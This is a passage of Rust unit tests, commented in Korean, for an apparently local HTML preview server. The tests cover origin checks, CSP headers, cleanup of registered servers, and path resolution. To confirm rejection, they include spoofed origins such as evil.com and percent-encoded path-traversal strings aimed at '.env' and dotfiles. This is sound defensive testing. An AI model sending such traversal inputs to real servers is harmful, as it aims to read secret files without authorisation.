        // 다른 포트(=다른 프리뷰 서버)나 원격 출처는 통과하면 안 된다
        assert!(!"http://127.0.0.1:9999/".starts_with(&origin));
        assert!(!"https://evil.com/".starts_with(&origin));
        // 접두사 위장 차단 — 끝의 '/'까지 비교하므로 걸러진다
        assert!(!"http://127.0.0.1:8941.evil.com/".starts_with(&origin));
        // Referer 부재(직접 curl 등)도 통과하면 안 된다
        assert!(!"".starts_with(&origin));
    }

    #[test]
    fn csp_only_on_documents() {
        assert!(csp_header(Path::new("/a/index.html")).contains("connect-src 'self'"));
        assert!(csp_header(Path::new("/a/p.XHTML")).contains("form-action 'none'"));
        // 문서가 아닌 서브리소스엔 붙이지 않는다(CSP는 문서가 소유한다).
        assert_eq!(csp_header(Path::new("/a/style.css")), "");
        assert_eq!(csp_header(Path::new("/a/app.js")), "");
        // frame-ancestors는 절대 넣지 않는다 — 교차 출처 iframe이 차단돼 기능이 죽는다.
        assert!(!csp_header(Path::new("/a/index.html")).contains("frame-ancestors"));
        // default-src도 넣지 않는다 — CDN 스크립트/폰트를 쓰는 정상 프리뷰가 깨진다.
        assert!(!csp_header(Path::new("/a/index.html")).contains("default-src"));
    }

    #[test]
    fn revoke_under_kills_only_matching_subtree() {
        let mut reg = PreviewServers::default();
        let mk = || ServerEntry {
            port: 1,
            token: "t".into(),
            alive: Arc::new(AtomicBool::new(true)),
            last_hit: Arc::new(AtomicU64::new(0)),
            started: Instant::now(),
        };
        let inside = PathBuf::from("/repos/alpha/docs");
        let root = PathBuf::from("/repos/alpha");
        let other = PathBuf::from("/repos/beta");
        // 문자열 접두사로 비교하면 잘못 폐기될 이름 — Path::starts_with는 컴포넌트 단위라 안전.
        let sibling = PathBuf::from("/repos/alpha2");
        let inside_alive = mk();
        let other_alive = mk();
        let sib_alive = mk();
        let (ia, oa, sa) = (
            inside_alive.alive.clone(),
            other_alive.alive.clone(),
            sib_alive.alive.clone(),
        );
        reg.ports.insert(inside, inside_alive);
        reg.ports.insert(root.clone(), mk());
        reg.ports.insert(other.clone(), other_alive);
        reg.ports.insert(sibling.clone(), sib_alive);

        assert_eq!(reg.revoke_under(&root), 2); // 레포 루트 + 그 하위 폴더만
        assert!(!ia.load(Ordering::Relaxed)); // 하위 서버는 종료 신호를 받는다
        assert!(oa.load(Ordering::Relaxed)); // 다른 레포는 건드리지 않는다
        assert!(sa.load(Ordering::Relaxed)); // "alpha2"는 "alpha" 하위가 아니다
        assert!(reg.ports.contains_key(&other)); // 엔트리도 남는다
        assert!(reg.ports.contains_key(&sibling));
        assert!(!reg.ports.contains_key(&root)); // 폐기된 것은 즉시 빠져 다음 mint가 새로 띄운다
    }

    /// 회귀 방지: 죽은 서버 엔트리는 mint 때 회수되고, 재사용 후보로도 잡히면 안 된다.
    /// (accept 루프가 오류로 죽을 때 alive를 내리지 않으면 여기서 살아있는 것으로 보여
    /// 다음 mint가 닫힌 포트를 재사용한다 — 브라우저는 연결 거부를 본다.)
    #[test]
    fn prune_dead_reclaims_and_blocks_reuse() {
        let mut reg = PreviewServers::default();
        let mk = |alive: bool| ServerEntry {
            port: 1,
            token: "t".into(),
            alive: Arc::new(AtomicBool::new(alive)),
            last_hit: Arc::new(AtomicU64::new(0)),
            started: Instant::now(),
        };
        let live = PathBuf::from("/repos/alpha/docs");
        let idle_dead = PathBuf::from("/repos/alpha/site"); // 유휴 종료
        let accept_dead = PathBuf::from("/repos/beta"); // accept 오류로 종료
        reg.ports.insert(live.clone(), mk(true));
        reg.ports.insert(idle_dead.clone(), mk(false));
        reg.ports.insert(accept_dead.clone(), mk(false));

        assert_eq!(reg.prune_dead(), 2, "죽은 엔트리 둘만 회수");
        assert!(reg.ports.contains_key(&live), "살아있는 서버는 남는다");
        assert!(!reg.ports.contains_key(&idle_dead));
        assert!(!reg.ports.contains_key(&accept_dead));
        // 재사용 후보 조회(mint와 같은 조건)에도 잡히지 않는다 → 새 서버를 띄운다.
        assert!(reg
            .ports
            .get(&accept_dead)
            .filter(|e| e.alive.load(Ordering::Relaxed))
            .is_none());
        // 반복 호출은 아무것도 지우지 않는다(멱등).
        assert_eq!(reg.prune_dead(), 0);
    }

    #[test]
    fn resolve_request_path_blocks_traversal_and_dotfiles() {
        // 실제 파일시스템으로 검증 — canonicalize가 존재하는 경로를 요구한다.
        let dir = std::env::temp_dir().join(format!("gpv-preview-{}", Uuid::new_v4().simple()));
        let sub = dir.join("assets");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(dir.join("index.html"), b"<html>").unwrap();
        std::fs::write(sub.join("app.js"), b"//js").unwrap();
        std::fs::write(dir.join(".env"), b"SECRET=1").unwrap();
        std::fs::write(sub.join(".secret"), b"x").unwrap();
        let base = dunce::canonicalize(&dir).unwrap();

        // 정상 경로는 해석된다.
        assert!(resolve_request_path(&base, "/index.html").is_some());
        assert!(resolve_request_path(&base, "/assets/app.js").is_some());

        // %2F로 세그먼트에 구분자를 밀어넣어 dotfile·상위 이탈을 시도 — 전부 거부.
        assert!(resolve_request_path(&base, "/assets%2F..%2F.env").is_none());
        assert!(resolve_request_path(&base, "/assets%2F.secret").is_none());
        assert!(resolve_request_path(&base, "/assets%5C.secret").is_none());
        // 평문 dotfile·상위 세그먼트도 거부.
        assert!(resolve_request_path(&base, "/.env").is_none());
        assert!(resolve_request_path(&base, "/assets/.secret").is_none());
        assert!(resolve_request_path(&base, "/../secret").is_none());
        // 존재하지 않는 파일은 None.
        assert!(resolve_request_path(&base, "/nope.js").is_none());
        // 디렉토리는 파일이 아니므로 None.
        assert!(resolve_request_path(&base, "/assets").is_none());

        let _ = std::fs::remove_dir_all(&dir);
    }
}
